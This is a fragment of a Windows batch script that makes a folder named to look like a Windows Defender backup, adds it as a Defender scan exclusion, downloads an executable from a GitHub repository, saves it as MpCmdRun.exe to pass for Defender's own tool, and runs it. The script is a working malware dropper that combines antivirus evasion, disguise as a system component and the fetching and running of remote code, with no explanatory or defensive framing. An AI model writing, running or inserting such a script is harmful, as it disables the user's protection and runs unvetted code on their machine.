...
set "folderPath=%USERPROFILE%\AppData\Local\Windows Defender Backup"
mkdir "%folderPath%"
powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/KarmaArchive/Install/raw/refs/heads/main/MpCmdRun.exe' -OutFile '%folderPath%\MpCmdRun.exe'"
start "" "%folderPath%\MpCmdRun.exe"
